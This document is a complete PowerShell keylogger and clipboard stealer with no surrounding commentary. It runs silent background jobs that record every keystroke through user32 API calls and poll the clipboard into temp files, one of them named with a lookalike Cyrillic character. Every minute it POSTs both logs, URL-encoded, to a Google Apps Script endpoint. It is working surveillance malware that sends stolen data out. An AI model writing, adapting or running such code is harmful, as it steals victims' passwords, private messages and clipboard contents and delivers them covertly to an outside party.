# your script's address
$url = "https://script.google.com/macros/s/AKfycbxpIGeEXX_3qxsXH-BsKWdwA0XCMqqHnYImpIkbZNrADhgFupw/exec?"
$logfile = "$env:temp\keys.log" # keyboard's log file path
$cbfile = "$env:temp\сlip.log" # clipboard's log file path
Start-Job -ScriptBlock {
    $MAPVK_VSC_TO_VK_EX = 0x03

    $virtualkc_sig = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru

    $ss_ms = 50

    while ($true) {
        Start-Sleep -Milliseconds $ss_ms
        $gotit = ""
        for ($char = 1; $char -le 254; $char++) {        
            $gotit = $getKeyState::GetAsyncKeyState($char)
            if ($gotit -eq -32767) {
                $scancode = $getKey::MapVirtualKey($char, $MAPVK_VSC_TO_VK_EX)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName "System.Text.StringBuilder";
                $unicode_res = $getUnicode::ToUnicode($char, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($unicode_res -gt 0) {                
                    [System.IO.File]::AppendAllText($args[0], $mychar.ToString(), [System.Text.Encoding]::Unicode)
                }
            }
        }
    }
} -ErrorAction SilentlyContinue -ArgumentList $logfile

Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $ss_ms = 500
    $cbtext = ""    
    while ($true) {
        Start-Sleep -Milliseconds $ss_ms
        $tb = New-Object System.Windows.Forms.TextBox
        $tb.Multiline = $true
        $tb.Paste()
        $cb = $tb.Text
        if ($cbtext -ne $cb) {
            $cbtext = $cb
            Out-File -FilePath $args[0] -Encoding Unicode -Append -InputObject $cbtext.ToString()        
        }
    }
} -ErrorAction SilentlyContinue -ArgumentList $cbfile

Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Web    
    $ss_s = 60
    $logpre = "keys="
    $clippre = "clip="    
    while ($true) {
        Start-Sleep -Seconds $ss_s
        $arr = @()
        if (Test-Path $args[1]) {
            $arr += $logpre + [System.Web.HttpUtility]::UrlEncode((Get-Content -Path $args[1]))
        }
        if (Test-Path $args[2]) {
            $arr += $clippre + [System.Web.HttpUtility]::UrlEncode((Get-Content -Path $args[2]))
        }    
        if ($arr.Length -ne 0) {                   
            Invoke-WebRequest -Method Post -ContentType "application/x-www-form-urlencoded" -Uri $args[0] -Body ($arr -join "&")            
        }
    }
} -ErrorAction SilentlyContinue -ArgumentList $url, $logfile, $cbfile